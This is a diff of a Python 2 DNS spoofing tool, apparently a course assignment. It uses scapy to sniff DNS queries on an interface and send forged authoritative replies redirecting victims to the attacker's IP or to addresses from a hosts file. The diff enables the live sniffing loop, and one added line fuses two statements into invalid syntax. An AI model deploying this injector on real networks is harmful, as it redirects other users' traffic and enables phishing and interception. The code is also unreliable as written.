@@ -4,6 +4,7 @@
 
 
 #pypcap library for default interfac?? piazaa (https://piazza.com/class/j6lyorzz9qj5i3?cid=175)
+#expression wala check, expression in ip or ip in expression
 
 
 
@@ -12,13 +13,13 @@ import netifaces as ni
 import os
 import socket
 import pcap
-
+from scapy.all import *
 
 
 def get_ip(ifname):
     	ni.ifaddresses(ifname)
 	ip = ni.ifaddresses(ifname)[ni.AF_INET][0]['addr']
-	print ip  # should print "192.168.100.37"
+	return ip  # should print "192.168.100.37"
 
 #def injector(packet):
 #    if packet.haslayer(TCP):
@@ -27,26 +28,32 @@ def get_ip(ifname):
 #        print pkt[TCP]
 
 def injector(pkt):
-	if((pkt[IP].src in expression) or (expression == None)): 
-		redirect_to = get_ip(interface)
-		if pkt.haslayer(DNSQR): # DNS question record
-			affectedHost = pkt[DNSQR].qname
-			if hostsmap!=None:
-				file=open(hostsmap,"r")
-				for line in file:
-					if affectedHost in line:	
-	                    			row = line.split(" ")
-	                    			redirect_to = row[0]
-	
-			spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
-				      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
-				      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
-				      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
-			send(spoofed_pkt)
-			print 'Sent:', spoofed_pkt.summary()
+	pkt.show()print '--------------------------------has IP----------------------------------------'
+	if pkt.haslayer(IP) and pkt.haslayer(DNSQR) and pkt[DNS].aa == 0:
+		#print '--------------------------------has IP----------------------------------------'
+	#if((pkt[IP].src in expression) or (expression == "")): 
+		#if pkt.haslayer(DNSQR): # DNS question record
+		print 'has DNSQR'
+		affectedHost = pkt[DNSQR].qname
+		if options.hostsmap!=None:
+			file=open(options.hostsmap,"r")
+			for line in file:
+				if affectedHost in line:	
+                    			row = line.split(" ")
+                    			redirect_to = row[0]
+		else:
+			redirect_to = get_ip(options.interface)
+		print 'starting spoofing'
+		spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
+			      UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
+			      DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
+			      an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
+		print 'spoofed'
+		send(spoofed_pkt)
+		print 'Sent:', spoofed_pkt.summary()
 
 if __name__ == '__main__':
-	expression = None
+	#expression = ""
 	parser = OptionParser()
 	parser.set_conflict_handler("resolve")
 	parser.add_option('-i', dest="interface",default=pcap.lookupdev())
@@ -56,11 +63,14 @@ if __name__ == '__main__':
 	expression = remainder
 	print options.interface
 	print options.hostsmap
-	if expression:
-		print expression[0]
+	print expression
+	if len(expression)>0:
+		exp = expression[0]
+	else:
+		exp = ""
 	#get_ip('ens33')
 
-	#sniff(filter=expression, prn=injector, store=0, iface=interface)
+	sniff(filter=exp, prn=injector, store=0, iface=options.interface)
 
 
 
